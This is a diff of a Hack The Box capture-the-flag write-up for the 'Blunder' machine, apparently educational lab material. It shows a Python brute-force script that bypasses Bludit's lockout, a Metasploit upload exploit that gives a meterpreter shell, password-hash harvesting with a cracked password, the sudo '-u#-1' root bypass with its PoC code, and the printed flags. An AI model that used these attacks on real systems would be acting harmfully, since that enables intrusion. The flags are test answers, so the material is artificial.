@@ -2,13 +2,13 @@
 
 ## Overview
 
-![](https://github.com/zweilosec/htb-writeups/tree/dda4572d292886fc4ce08354b2cca9e61a905df3/linux-machines/easy/machine%3E.infocard.png)
+![](../../.gitbook/assets/screenshot-2020-10-27-201546.png)
 
 Short description to include any strange things to be dealt with
 
 ## Useful Skills and Tools
 
-#### Useful thing 1
+#### Bypass restrictions on running commands as root `sudo (ALL, !root) /bin/bash`
 
 * description with generic example
 
@@ -19,6 +19,8 @@ Short description to include any strange things to be dealt with
 ## Enumeration
 
 ### Nmap scan
+
+I started my enumeration with an nmap scan of `10.10.10.191`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
 
 ```text
 zweilos@kali:~/htb/blunder$ nmap -p- -sC -sV -oN blunder 10.10.10.191
@@ -37,9 +39,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 379.53 seconds
 ```
 
-I started my enumeration with an nmap scan of `10.10.10.191`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
-
 only port 80 open
+
+![](../../.gitbook/assets/2-bluder-site.png)
 
 website of random facts.
 
@@ -113,11 +115,25 @@ website of random facts.
 + 1 host(s) tested
 ```
 
-`/admin/` has login. `nikto` reveals a lot of security misconfigurations, though not many seem accessible without credentials. `.gitignore` file possibly reveals directory structure.
+`nikto` reveals a lot of security misconfigurations, though not many seem accessible without credentials. 
+
+![](../../.gitbook/assets/3-admin-page%20%281%29.png)
+
+`/admin/` has login. \(no creds yet\)
+
+![](../../.gitbook/assets/5-gitignore.png)
+
+`.gitignore` file possibly reveals directory structure.
+
+![](../../.gitbook/assets/4-already-installed.png)
+
+`install.php` found, reports that Bludit is already installed. - researched Bludit
+
+![](../../.gitbook/assets/6-todo.png)
 
 `todo.txt` contains a potential username `fergus`
 
-The header of the file `config.log` contained the lines
+The header of the file `config.log` contained the lines:
 
 ```text
 <!DOCTYPE html>
@@ -144,7 +160,12 @@ The header of the file `config.log` contained the lines
     </head>
 ```
 
-"/bl-kernel/img/favicon.png?version=3.9.2" tells me the version of the service is 3.9.2 . Searching for "bludit 3.9.2 exploit" leads to [https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb](https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb) which links to [https://rastating.github.io/bludit-brute-force-mitigation-bypass/](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) [https://github.com/averagesecurityguy/scripts/blob/master/bruteforce/multi\_ssh.py](https://github.com/averagesecurityguy/scripts/blob/master/bruteforce/multi_ssh.py) [https://github.com/bludit/bludit/issues/1081](https://github.com/bludit/bludit/issues/1081)
+"`/bl-kernel/img/favicon.png?version=3.9.2`" tells me the version of the service is 3.9.2 . Searching for "bludit 3.9.2 exploit" leads to
+
+* [https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb](https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb)
+* [https://rastating.github.io/bludit-brute-force-mitigation-bypass/](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) 
+* [https://github.com/averagesecurityguy/scripts/blob/master/bruteforce/multi\_ssh.py](https://github.com/averagesecurityguy/scripts/blob/master/bruteforce/multi_ssh.py) 
+* [https://github.com/bludit/bludit/issues/1081](https://github.com/bludit/bludit/issues/1081)
 
 ```python
 #!/usr/bin/env python3
@@ -260,15 +281,18 @@ if __name__ == '__main__':
         print('SUCCESSFUL LOGIN at {0}: {1}/{2}'.format(login_url, username, word))
 ```
 
-After writing my python brute-force program based off the one in the POC, I loaded it with rockyou.txt and let it run. After it ran most of the day and didn't get any results, I decided to try another direction. Since the site had plenty of text on it I decided to run `cewl` against it to build a custom wordlist. I also included all of the pages I had enumerated with `dirbuster`.
+After writing my python brute-force program based off the one in the POC, I loaded it with `rockyou.txt` and let it run. After it ran most of the day and didn't get any results, I decided to try another direction. Since the site had plenty of text on it I decided to run `cewl` against it to build a custom wordlist. I also included all of the pages I had enumerated with `dirbuster`.
+
+![](../../.gitbook/assets/7-password-found.png)
 
 This worked much faster. It still had to go through a few thousand tries, but for my multithreaded script it didn't take long.
 
-![](https://github.com/zweilosec/htb-writeups/tree/dda4572d292886fc4ce08354b2cca9e61a905df3/linux-machines/easy/Password_found.png)
-
 ## Initial Foothold
 
-Now that I had a working username and password to the `/admin/` page I was able to use the exploit I had found. There was a nice and easy MetaSploit module so I fired up `msfconsole`.  
+![](../../.gitbook/assets/8-upload-vuln.png)
+
+Now that I had a working username and password to the `/admin/` page I was able to use the exploit I had found. I poked around on the site a bit and found an upload page that looked interesting, but after a bit of quick searching I found out that there was a nice and easy MetaSploit module so I fired up `msfconsole`. 
+
 [https://github.com/rapid7/metasploit-framework/pull/12542/files](https://github.com/rapid7/metasploit-framework/pull/12542/files)
 
 ```text
@@ -391,6 +415,8 @@ msf5 exploit(linux/http/bludit_upload_images_exec) > run
 meterpreter >
 ```
 
+After doing a few quick configurations of the parameters for the exploit, I had a meterpreter shell.
+
 ## Road to User
 
 ```text
@@ -427,7 +453,7 @@ meterpreter > download users.php
 [*] download   : users.php -> users.php
 ```
 
-users.php sounded like a likely place to find some information about...users.
+The file `users.php` in the `/var/www/bludit-3.9.2/bl-content/databases/` folder sounded like a likely place to find some information about...users.
 
 ```text
 <?php defined('BLUDIT') or die('Bludit CMS.'); ?>
@@ -529,9 +555,11 @@ Least Possible Hashs:
 --------------------------------------------------
 ```
 
+The most likely hash type was SHA-1.  
+
 ### Further enumeration
 
-after trying a few online hash-cracking sites and getting nowhere, I decided to keep looking before resorting to trying `hashcat` or `john`.
+After trying a few online hash-cracking sites and getting nowhere, I decided to keep looking before resorting to trying `hashcat` or `john`.
 
 ```text
 meterpreter > cd /var/www/bludit-3.10.0a
@@ -605,7 +633,7 @@ In the www folder I found a newer version of the Bludit CMS had been installed. 
 
 ### Finding user creds
 
-the users.php file contained a \(un-salted!\) hash for the user Hugo.
+The updated `users.php` file contained an \(un-salted!\) hash for the user Hugo.
 
 ```text
 <?php defined('BLUDIT') or die('Bludit CMS.'); ?>
@@ -631,7 +659,7 @@ the users.php file contained a \(un-salted!\) hash for the user Hugo.
 }
 ```
 
-I checked the `/home` folder to see what users were on this machine and there was indeed one named `hugo`, and it had the `user.txt` flag in it!
+I checked the `/home` folder to see what users were on this machine and there was indeed one named `hugo`!
 
 ```text
 meterpreter > ls
@@ -644,13 +672,13 @@ Mode             Size  Type  Last modified              Name
 40755/rwxr-xr-x  4096  dir   2020-04-28 07:13:35 -0400  shaun
 ```
 
-The first hash cracking website I tried the hash on immediately revealed the password...
+![](../../.gitbook/assets/9-password-cracked.png)
 
-![](https://github.com/zweilosec/htb-writeups/tree/dda4572d292886fc4ce08354b2cca9e61a905df3/linux-machines/easy/password-cracked.png)
+The first hash cracking website I tried the hash on immediately revealed the password as `Password120`
 
 ### User.txt
 
-Since there were no remote connection ports open such as SSH, I needed to swith users in the shell I had. I decided to switch to bash since I wasnt too sure what capabilites meterpreter might have and my commands seemed limited.
+Since there were no remote connection ports open such as SSH, I needed to switch users in the shell I had. I decided to switch to bash since I wasn't too sure what capabilities meterpreter might have, and my commands seemed limited.
 
 ```text
 meterpreter > shell
@@ -675,6 +703,10 @@ hugo@blunder:~$ cat user.txt
 cat user.txt
 dcf1f1f3ecde4b372edf165518df8a77
 ```
+
+{% hint style="info" %}
+Hint: trying to upgrade a shell by using **`stty raw -echo`** does not work in a shell gained through meterpreter...
+{% endhint %}
 
 ## Path to Power \(Gaining Administrator Access\)
 
@@ -740,12 +772,12 @@ hugo@blunder:/var/log$ id shaun
 uid=1000(shaun) gid=1000(shaun) groups=1000(shaun),4(adm),24(cdrom),30(dip),46(plugdev),119(lpadmin),130(lxd),131(sambashare)
 ```
 
-`temp` only has access to temp group
-
 ```text
 hugo@blunder:/var/log$ groups temp
 temp : temp
 ```
+
+`temp` only has access to temp group
 
 ```text
 hugo@blunder:~$ sudo -l
@@ -760,9 +792,13 @@ User hugo may run the following commands on blunder:
     (ALL, !root) /bin/bash
 ```
 
-doing a search for `sudo (ALL, !root) /bin/bash` finds [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502) which explains a privilege bypass method where you can get around the restriction on running commands as root \(`!root`\) by tricking sudo by giving the user `#-1`.
+I did a search for `sudo (ALL, !root) /bin/bash` and found an exploit on exploit-db which explains a privilege bypass method where you can get around the restriction on running commands as root \(`!root`\) by tricking sudo by giving the user id number `#-1`.
 
-```text
+ [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)
+
+> Description : Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv -u\#-1 returns as 0 which is root's id and /bin/bash is executed with root permission
+
+```python
 # Exploit Title : sudo 1.8.27 - Security Bypass
 # Date : 2019-10-15
 # Original Author: Joe Vennix
@@ -842,7 +878,7 @@ print("Lets hope it works")
 os.system("sudo -u#-1 "+ binary)
 ```
 
-> Description : Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv -u\#-1 returns as 0 which is root's id and /bin/bash is executed with root permission
+The POC code for the exploit included a basic python script which could automate running a program as root, but it would be much easier to exploit this manually and get a root shell since it is so simple to execute.
 
 ### Getting a shell
 
@@ -861,9 +897,15 @@ e65080f4dddab786a01c78e4df40f5f7
 root@blunder:/dev/shm#
 ```
 
+First I ran `sudo /bin/bash` with user ID `'0'` to test the restriction on running commands as root to see if it could be bypassed by simply giving the ID number for root instead.  This did not work \(as expected\).  
+
+Next I used the invalid user ID number `'-1'` with the same command and compared my old `id` command output to my new effective user permissions.  I was now logged in as `root` and able to collect my proof.
+
+![](../../.gitbook/assets/screenshot-2020-10-27-201305.png)
+
 ### Root.txt
 
-Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.
+Thanks to [`egotisticalSW`](https://app.hackthebox.eu/users/94858) for creating this machine with an easy, yet fun new privilege escalation method!  I always love learning new ways to exploit systems that are so simple, yet so elegant.
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
 
